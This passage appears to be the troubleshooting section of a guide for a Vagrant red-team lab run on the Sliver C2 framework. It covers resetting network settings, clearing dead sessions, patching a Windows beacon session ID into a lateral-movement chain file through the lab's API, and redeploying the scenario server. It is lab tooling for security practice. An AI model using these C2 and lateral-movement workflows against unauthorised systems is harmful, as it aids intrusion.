Set-NetIPInterface -InterfaceAlias "Ethernet" -Dhcp Enabled
ipconfig /release "Ethernet"
ipconfig /renew "Ethernet"
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses "8.8.8.8","1.1.1.1"
```

**Dead sessions clogging the session list:**
```bash
sliver-client
sessions --clean
```

**Two-beacon chain fails with "Invalid session ID"** — the Windows session UUID in `lateral-two-beacons.yaml` is stale. Update it:

```bash
WIN=$(curl -s http://192.168.56.5:8080/api/v1/sessions | \
  jq -r '.[] | select(.os=="windows") | .id' | head -1)
python3 -c "
import re
WIN='$WIN'
with open('examples/lateral-two-beacons.yaml') as f:
    content = f.read()
content = re.sub(r'printf \"%s\\\\n\" \"[0-9a-f-]+\"', f'printf \"%s\\\\n\" \"{WIN}\"', content)
with open('examples/lateral-two-beacons.yaml', 'w') as f:
    f.write(content)
print('Updated with:', WIN)
"
curl -s -X PUT http://192.168.56.5:8080/api/v1/chains/lateral-two-beacons \
  -H 'Content-Type: application/yaml' --data-binary @examples/lateral-two-beacons.yaml | jq -r '.name'
```

**Rebuild and redeploy scenario-server:**
```bash
make scenario
vagrant ssh c2 -c "sudo systemctl stop scenario-server"
vagrant upload scenario-server /tmp/scenario-server c2
vagrant ssh c2 -c "sudo cp /tmp/scenario-server /usr/local/bin/scenario-server && \
  sudo chmod +x /usr/local/bin/scenario-server && sudo systemctl start scenario-server"
```

### Building and Moving the Package Out

```bash
cp -r scenario/ /path/to/standalone/
cd /path/to/standalone
go mod tidy
```
